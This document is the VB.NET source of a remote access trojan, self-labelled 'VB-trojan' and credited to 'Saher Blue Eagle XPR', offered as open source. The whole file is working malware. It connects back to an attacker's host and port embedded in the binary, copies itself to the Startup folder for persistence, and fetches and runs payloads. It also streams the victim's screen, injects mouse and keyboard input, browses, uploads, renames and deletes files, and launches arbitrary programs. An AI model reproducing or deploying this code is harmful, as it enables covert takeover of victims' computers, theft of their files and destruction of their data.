Module Main
    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################


    Private Host As String = "%Host%"
    Private Port As String = "%Port%"
    Private YY As String = "||"
    Private Const spl As String = "abccba"
    Private alaa(), text1, text2 As String
    Private WithEvents client As SocketClient
    Private WithEvents Timer1 As New Timer
    Private culture As String = System.Globalization.CultureInfo.CurrentCulture.EnglishName
    Private country As String = culture.Substring(culture.IndexOf("("c) + 1, culture.LastIndexOf(")"c) - culture.IndexOf("("c) - 1)
    Private Is_Connected As Boolean = False
    Private cap As New CRDP
    Private Declare Sub mouse_event Lib "user32" Alias "mouse_event" (ByVal dwFlags As Integer, ByVal dx As Integer, ByVal dy As Integer, ByVal cButtons As Integer, ByVal dwExtraInfo As Integer)

    Private Sub Connected() Handles client.Connected
        Is_Connected = True
        Timer1.Stop()
    End Sub
    Private Sub Disconnected() Handles client.Disconnected
        Is_Connected = False
        Timer1.Start()
    End Sub
    Private Sub Data(ByVal B As Byte()) Handles client.Data
        Dim bv As String = Return_String(B).Replace(vbNewLine, "")
        bv = bv.Replace("fxf0x4x4x0fxf", YY)
        Dim a As String() = Split(bv, YY)
        Try
            Select Case a(0)
                Case "info"
                    client.Send("info" & YY & "VB-trojan" & YY & SystemInformation.UserName & YY & My.Computer.Info.OSFullName & YY & country)
                Case "rufle"
                    IO.File.WriteAllBytes(IO.Path.GetTempPath & a(1), Convert.FromBase64String(a(2)))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    client.Send("success_run")
                    Process.Start(IO.Path.GetTempPath & a(1))

                Case "rulnk"
                    My.Computer.Network.DownloadFile(a(1), IO.Path.GetTempPath & a(2))
                    Threading.Thread.CurrentThread.Sleep(1000)
                    Process.Start(IO.Path.GetTempPath & a(2))
                Case "upfile"

                    MsgBox(a(1))
                    MsgBox(a(2))
                    client.Send("success_up")
                Case "dsktop"
                    cap.Clear()
                    Dim s = Screen.PrimaryScreen.Bounds.Size
                    client.Send("desktop" & YY & s.Width & YY & s.Height)
                    '    c.Send("!" & yy & s.Width & yy & s.Height)
                Case "openfm"
                    client.Send("fm")
                Case "@"
                    Try
                        Dim SizeOfimage As Integer = a(1)
                        Dim Split As Integer = a(2)
                        Dim Quality As Integer = a(3)

                        Dim Bb As Byte() = cap.Cap(SizeOfimage, Split, Quality)
                        Dim M As New IO.MemoryStream
                        Dim CMD As String = "@" & YY
                        M.Write(Return_Byte_array(CMD), 0, CMD.Length)
                        M.Write(Bb, 0, Bb.Length)
                        client.Send(M.ToArray)
                        M.Dispose()
                    Catch ex As Exception
                    End Try

                Case "#" ' mouse clicks
                    Cursor.Position = New Point(a(1), a(2))
                    mouse_event(a(3), 0, 0, 0, 1)
                Case "$" '  mouse move
                    Cursor.Position = New Point(a(1), a(2))
                Case "ke" 'keyboard keys
                    Try
                        SendKeys.Flush()
                        Select Case a(1)
                            Case "Return"
                                SendKeys.SendWait("{Enter}")

                            Case "BACKSPACE"
                                SendKeys.SendWait("{BACKSPACE}")

                            Case Else
                                SendKeys.SendWait(a(1))
                        End Select
                    Catch ex As Exception

                    End Try

                Case "endcon"
                    End

                Case "msg"

                    MsgBox("This Message is Informative only [No user Action Required " & vbNewLine & "Kid User Msg : " & a(1), MsgBoxStyle.Information, "You Have Been Hacked By (Blue Eagle XPR Tool [Kid User])")

                Case "getalldrives"
                    Dim DriveList As String() = System.Environment.GetLogicalDrives()
                    For i As Integer = 0 To DriveList.Length - 1
                        Dim d As New System.IO.DriveInfo(DriveList(i))
                        client.Send("flashaya" & YY & d.Name & YY & d.DriveType.ToString)
                    Next

                Case "getdrives"

                    Dim DriveList As String() = System.Environment.GetLogicalDrives()
                    For i As Integer = 0 To DriveList.Length - 1
                        Dim d As New System.IO.DriveInfo(DriveList(i))
                        client.Send("flashaya" & YY & d.Name & YY & d.DriveType.ToString)
                    Next

                Case "FileManager"
                    client.Send("filemanager" & YY & getFolders(a(1)) & getFiles(a(1)))

                Case "sendme"
                    Dim fpath As String = a(1)

                    Dim fname As String = New IO.FileInfo(fpath).Name

                    Dim filestring As String = Convert.ToBase64String(IO.File.ReadAllBytes(fpath))
                    Try
                        client.Send("savefile" & YY & fname & YY & filestring)
                    Catch ex As Exception
                        client.Send("errorf")
                    End Try

                Case "renamefile"
                    Try
                        Dim fpath_withname As String = a(1)
                        Dim fpath_with_out_name As String = a(2)
                        Dim newname_without_path As String = a(3)

                        My.Computer.FileSystem.RenameFile(fpath_withname, newname_without_path)
                        client.Send("rename_succ")
                    Catch ex As Exception

                    End Try

                Case "renamefolder"
                    Try
                        Dim fpath_withname As String = a(1)
                        Dim fpath_with_out_name As String = a(2)
                        Dim newname_without_path As String = a(3)

                        My.Computer.FileSystem.RenameDirectory(fpath_withname, newname_without_path)
                        client.Send("rename_succ")
                    Catch ex As Exception

                    End Try
                Case "delete"
                    Try
                        System.IO.File.Delete(a(1))
                        client.Send("rename_succ")
                    Catch ex As Exception
                        Try
                            System.IO.Directory.Delete(a(1))
                            client.Send("rename_succ")
                        Catch exx As Exception

                        End Try
                    End Try



                Case "execute"
                    Try
                        Process.Start(a(1))
                    Catch ex As Exception

                    End Try



            End Select
        Catch ex As Exception

        End Try
    End Sub
    Private Function getFolders(ByVal location) As String
        Dim di As New IO.DirectoryInfo(location)
        Dim folders = ""
        For Each subdi As IO.DirectoryInfo In di.GetDirectories
            folders += "[Folder]" & subdi.Name & "FileManagerSplitFileManagerSplit"
        Next
        Return folders
    End Function
    Private Function getFiles(ByVal location) As String
        Dim dir As New System.IO.DirectoryInfo(location)
        Dim files = ""
        For Each f As System.IO.FileInfo In dir.GetFiles("*.*")
            files += f.Name & "FileManagerSplit" & f.Length.ToString & "FileManagerSplit"
        Next
        Return files
    End Function
    Private Sub Connect_To_Server()
        Try
            client = New SocketClient
            Dim intport As Integer = Integer.Parse(Port)
            client.Connect(Host, intport)
            Timer1.Start()
        Catch ex As Exception : End Try
    End Sub
    Private Function Return_Byte_array(ByVal s As String) As Byte()
        Return System.Text.Encoding.Default.GetBytes(s)
    End Function
    Private Function Return_String(ByVal b As Byte()) As String
        Return System.Text.Encoding.Default.GetString(b)
    End Function
    Private Function Clear_Packets_From_Splitter_String(ByVal Incomming_Byte_Aray As Byte(), ByVal Splitter_Str As String) As Array
        On Error Resume Next
        Dim Array_List As New List(Of Byte())
        Dim Stream1 As New IO.MemoryStream
        Dim Stream2 As New IO.MemoryStream
        Dim T As String() = Split(Return_String(Incomming_Byte_Aray), Splitter_Str)
        Stream1.Write(Incomming_Byte_Aray, 0, T(0).Length)
        Stream2.Write(Incomming_Byte_Aray, T(0).Length + Splitter_Str.Length, Incomming_Byte_Aray.Length - (T(0).Length + Splitter_Str.Length))
        Array_List.Add(Stream1.ToArray)
        Array_List.Add(Stream2.ToArray)
        Stream1.Dispose()
        Stream2.Dispose()
        Return Array_List.ToArray
    End Function
    Public Sub Main()
        Try
            FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared) : text1 = Space(LOF(1)) : text2 = Space(LOF(1)) : FileGet(1, text1)
            FileGet(1, text2)
            FileClose() : alaa = Split(text1, spl) : Host = alaa(1) : Port = alaa(2)
            Timer1.Interval = 250
            Control.CheckForIllegalCrossThreadCalls = False
            Connect_To_Server()
        Catch ex As Exception

        End Try
     
      
        Application.Run()
    End Sub
    Dim starter_path As String
    Private Sub copytostartup()
        Dim dirto As String = Environment.GetFolderPath(Environment.SpecialFolder.Startup)
        Dim AppPath As String = Application.ExecutablePath
        Dim AutoStart As String = dirto & "/"
        Dim HideFile As IO.FileInfo = My.Computer.FileSystem.GetFileInfo(dirto)
        Dim name As String = Application.ExecutablePath.Replace(Application.StartupPath & "\", "")
        starter_path = AutoStart & name
        Try
            IO.File.Copy(AppPath, AutoStart & name, True)
        Catch ex As Exception
        End Try
    End Sub
    Private Sub Add_To_Startup()
        Try
            copytostartup()
        Catch ex As Exception

        End Try
    End Sub
    Private Sub Timer1_Tick() Handles Timer1.Tick

        If Is_Connected = True Then
            Exit Sub
        ElseIf Is_Connected = False Then
            Add_To_Startup()
            Connect_To_Server()
        End If

    End Sub
    Private Class SocketClient
        Private C As System.Net.Sockets.TcpClient
        Protected Friend Event Connected()
        Protected Friend Event Disconnected()
        Protected Friend Event Data(ByVal b As Byte())
        Private IsBuzy As Boolean = False
        Protected Friend Sub Connect(ByVal h As String, ByVal p As Integer)
            Try
                Try
                    If C IsNot Nothing Then
                        C.Close()
                        C = Nothing
                    End If
                Catch ex As Exception
                End Try
                Do Until IsBuzy = False
                    Threading.Thread.CurrentThread.Sleep(1)
                Loop
                Try
                    C = New System.Net.Sockets.TcpClient

                    C.Connect(h, p)
                    Dim t As New Threading.Thread(AddressOf RC, 10)
                    t.Start()
                    RaiseEvent Connected()
                Catch ex As Exception
                End Try
            Catch ex As Exception
                RaiseEvent Disconnected()
            End Try
        End Sub
        Private SPL As String = "c2x2824x828200x0c" ' split packets by this word
        Protected Friend Sub DisConnect()
            Try
                C.Close()
            Catch ex As Exception
            End Try
            C = Nothing
            RaiseEvent Disconnected()
        End Sub
        Protected Friend Sub Send(ByVal s As String)
            Send(Return_Byte_array(s))
        End Sub
        Protected Friend Sub Send(ByVal b As Byte())
            Try
                Dim m As New IO.MemoryStream
                m.Write(b, 0, b.Length)
                m.Write(Return_Byte_array(SPL), 0, SPL.Length)
                C.Client.Send(m.ToArray, 0, m.Length, System.Net.Sockets.SocketFlags.None)
            Catch ex As Exception
                DisConnect()
            End Try
        End Sub
        Private Sub RC()
            IsBuzy = True
            Dim M As New IO.MemoryStream
            Dim cc As Integer = 0
re:
            Threading.Thread.CurrentThread.Sleep(1)

            Try
                If C Is Nothing Then
                    GoTo co
                Else
                    If C.Client.Connected = False Then
                        GoTo co
                    Else
                        cc += 1
                        If cc > 100 Then
                            cc = 0
                            Try
                                If C.Client.Poll(-1, Net.Sockets.SelectMode.SelectRead) And C.Client.Available <= 0 Then
                                    GoTo co
                                End If
                            Catch ex As Exception
                                GoTo co
                            End Try
                        End If

                    End If
                End If
                If C.Available > 0 Then
                    Dim B(C.Available - 1) As Byte
                    C.Client.Receive(B, 0, B.Length, Net.Sockets.SocketFlags.None)
                    M.Write(B, 0, B.Length)
rr:
                    If Return_String(M.ToArray).Contains(SPL) Then
                        Dim A As Array = Clear_Packets_From_Splitter_String(M.ToArray, SPL)
                        RaiseEvent Data(A(0))
                        M.Dispose()
                        M = New IO.MemoryStream
                        If A.Length = 2 Then
                            M.Write(A(1), 0, A(1).length)
                            Threading.Thread.CurrentThread.Sleep(1)
                            GoTo rr
                        End If
                    End If
                End If
            Catch ex As Exception
                GoTo co
            End Try
            GoTo re
co:
            IsBuzy = False
            DisConnect()
        End Sub
    End Class
    Private Class CRDP
        Private Shared OA As New List(Of Bitmap)
        Private Shared OAA As New List(Of Point)
        Private Shared OM As New Bitmap(1, 1)
        Private Shared Function QZ(ByVal q As Integer) As Size
            Dim zs As New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height)
            Select Case q
                Case 0
                    Return zs
                Case 1
                    zs.Width = zs.Width / 1.1
                    zs.Height = zs.Height / 1.1
                Case 2
                    zs.Width = zs.Width / 1.3
                    zs.Height = zs.Height / 1.3
                Case 3
                    zs.Width = zs.Width / 1.5
                    zs.Height = zs.Height / 1.5
                Case 4
                    zs.Width = zs.Width / 1.9
                    zs.Height = zs.Height / 1.9
                Case 5
                    zs.Width = zs.Width / 2
                    zs.Height = zs.Height / 2
                Case 6
                    zs.Width = zs.Width / 2.1
                    zs.Height = zs.Height / 2.1
                Case 7
                    zs.Width = zs.Width / 2.2
                    zs.Height = zs.Height / 2.2
                Case 8
                    zs.Width = zs.Width / 2.5
                    zs.Height = zs.Height / 2.5
                Case 9
                    zs.Width = zs.Width / 3
                    zs.Height = zs.Height / 3
                Case 10
                    zs.Width = zs.Width / 3.5
                    zs.Height = zs.Height / 3.5
                Case 11
                    zs.Width = zs.Width / 4
                    zs.Height = zs.Height / 4
                Case 12
                    zs.Width = zs.Width / 5
                    zs.Height = zs.Height / 5
                Case 13
                    zs.Width = zs.Width / 6
                    zs.Height = zs.Height / 6
            End Select
            zs.Width = Mid(zs.Width.ToString, 1, zs.Width.ToString.Length - 1) & 0
            zs.Height = Mid(zs.Height.ToString, 1, zs.Height.ToString.Length - 1) & 0
            Return zs
        End Function
        Private Shared Function Gd(Optional ByVal Wi As Integer = 0, Optional ByVal He As Integer = 0, Optional ByVal Sh As Boolean = True) As Image
            Dim W As Integer = Screen.PrimaryScreen.Bounds.Width
            Dim H As Integer = Screen.PrimaryScreen.Bounds.Height
            Dim B As New Bitmap(W, H)
            Dim g As Graphics = Graphics.FromImage(B)
            g.CompositingQuality = System.Drawing.Drawing2D.CompositingQuality.HighSpeed
            g.CopyFromScreen(0, 0, 0, 0, New Size(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height), CopyPixelOperation.SourceCopy)
            If Sh Then
                Try
                    Cursors.Default.Draw(g, New Rectangle(Cursor.Position, New Size(32, 32)))
                Catch ex As Exception
                End Try
            End If
            g.Dispose()
            If Wi = 0 And He = 0 Then
                Return B
            Else
                Return B.GetThumbnailImage(Wi, He, Nothing, Nothing)
            End If
        End Function
        Private Shared Function md5(ByVal bB As Byte()) As String
            Dim md5Obj As New System.Security.Cryptography.MD5CryptoServiceProvider
            bB = md5Obj.ComputeHash(bB)
            Return Convert.ToBase64String(bB)
        End Function
        Private Shared Function GetEncoderInfo(ByVal M As String) As System.Drawing.Imaging.ImageCodecInfo
            Dim j As Integer
            Dim encoders As System.Drawing.Imaging.ImageCodecInfo()
            encoders = System.Drawing.Imaging.ImageCodecInfo.GetImageEncoders()
            For j = 0 To encoders.Length
                If encoders(j).MimeType = M Then
                    Return encoders(j)
                End If
            Next j
            Return Nothing
        End Function
        Protected Friend Shared Sub Clear()
            oQ = -1
            oCo = -1
            oQu = -1
            OM = New Bitmap(1, 1)
        End Sub

        Private Shared oQ As Integer = 0
        Private Shared oCo As Integer = 0
        Private Shared oQu As Integer = 0
        Protected Friend Shared Function Cap(ByVal q As Integer, ByVal co As Integer, ByVal Qu As Integer) As Byte()
ee:
            Dim ZS As New Size(QZ(q))
            ZS.Width = Mid(ZS.Width.ToString, 1, ZS.Width.ToString.Length - 1) & 0
            ZS.Height = Mid(ZS.Height.ToString, 1, ZS.Height.ToString.Length - 1) & 0
            If OM.Size.Width <> ZS.Width Or OM.Height <> ZS.Height Or oCo <> co Or oQu <> Qu Then
                OA.Clear()
                OAA.Clear()
                OM = New Bitmap(ZS.Width, ZS.Height)
            End If
            oQ = q
            oCo = co
            oQu = Qu

            Dim A As New List(Of Bitmap)
            Dim AA As New List(Of Point)
            Dim m As Bitmap
            If OA.Count > 0 Then
                A.AddRange(OA.ToArray)
                OA.Clear()
                AA.AddRange(OAA.ToArray)
                OAA.Clear()

                m = OM
                GoTo e
            End If
            m = Gd(ZS.Width, ZS.Height)
            Dim w As Integer = ZS.Width
            Dim h As Integer = ZS.Height
            Dim K As Integer = 0
            For i As Integer = 0 To co - 1
                For ii As Integer = 0 To co - 1
                    Dim y As Integer = h / co * i
                    Dim x As Integer = w / co * ii
                    Dim wc As Integer = w / co
                    Dim hc As Integer = h / co
                    If wc.ToString.Contains(".") Then
                        wc = Split(wc, ".")(0)
                    End If
                    If hc.ToString.Contains(".") Then
                        hc = Split(hc, ".")(0)
                    End If
                    Dim MM As New IO.MemoryStream
                    Dim Mj = m.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim MJJ = OM.Clone(New Rectangle(x, y, wc, hc), m.PixelFormat)
                    Dim b1 As Byte()
                    Dim b2 As Byte()
                    Mj.Save(MM, Imaging.ImageFormat.Jpeg)
                    b1 = MM.ToArray
                    MM.Dispose()
                    MM = New IO.MemoryStream
                    MJJ.Save(MM, Imaging.ImageFormat.Jpeg)

                    b2 = MM.ToArray

                    MM.Dispose()
                    If md5(b1) = md5(b2) Then
                        Mj.Dispose()
                    Else
                        A.Add(Mj)
                        AA.Add(New Point(x, y))
                    End If
                    MJJ.Dispose()
nx:
                Next
            Next
e:

            If A.Count = 0 Then
                Return New Byte() {0}
            End If
            Dim hh As Integer = 0
            Dim QA As New List(Of Integer)
            For i As Integer = 0 To co * co / 5
                If i = A.Count Then Exit For
                QA.Add(i)
                hh += A(i).Height
            Next
            Dim xx As New Bitmap(A(0).Width, hh)
            Dim gg = Graphics.FromImage(xx)
            Dim tp As Integer = 0
            Dim s As String = m.Width & "." & m.Height & ","
            For Each i As Integer In QA
                s += AA(i).X & "." & AA(i).Y & "." & A(i).Height & ","
                gg.DrawImage(A(i), 0, tp)
                tp += A(i).Height
            Next
            s += "njq8"
            For i As Integer = 0 To A.Count - 1
                If QA.Contains(i) = False Then
                    OA.Add(A(i))
                    OAA.Add(AA(i))
                End If
            Next
            gg.Dispose()
            Dim JA = New IO.MemoryStream
            Dim eps As System.Drawing.Imaging.EncoderParameters = New System.Drawing.Imaging.EncoderParameters(1)
            eps.Param(0) = New System.Drawing.Imaging.EncoderParameter(Drawing.Imaging.Encoder.Quality, Qu)
            Dim ici As System.Drawing.Imaging.ImageCodecInfo = GetEncoderInfo("image/jpeg")
            xx.Save(JA, ici, eps)
            Dim J2 As New IO.MemoryStream
            J2.Write(System.Text.Encoding.Default.GetBytes(s), 0, s.Length)
            J2.Write(JA.ToArray, 0, JA.Length)
            OM = m
            xx.Dispose()
            Return J2.ToArray
        End Function
    End Class
End Module
